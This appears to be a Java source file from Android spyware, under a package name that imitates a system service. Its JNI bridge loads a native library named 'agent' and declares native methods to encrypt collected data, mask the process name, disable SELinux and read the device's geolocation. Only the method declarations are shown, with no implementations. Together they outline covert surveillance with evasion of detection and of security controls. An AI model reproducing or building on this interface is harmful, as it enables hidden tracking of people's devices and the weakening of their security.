package com.android.systemservice;

public class NativeBridge {
    static {
        System.loadLibrary("agent");
    }

    public static native String encryptData(String plaintextJson);

    public static native int maskProcessName(String name);

    public static native int disableSELinux();

    public static native String getGeolocationNative();
}
